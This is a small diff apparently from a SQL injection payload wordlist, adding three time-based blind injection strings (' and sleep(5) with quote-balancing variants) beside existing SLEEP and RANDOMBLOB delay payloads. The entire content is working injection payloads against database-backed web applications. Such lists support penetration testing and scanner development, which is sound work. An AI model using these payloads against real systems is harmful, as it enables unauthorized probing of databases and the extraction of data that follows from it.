@@ -52,3 +52,6 @@
 ' OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ' SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 " and sleep(5) --+
+ and sleep(5)
+' and sleep(5) and '1'='1
+" and sleep(5) and "1"="1
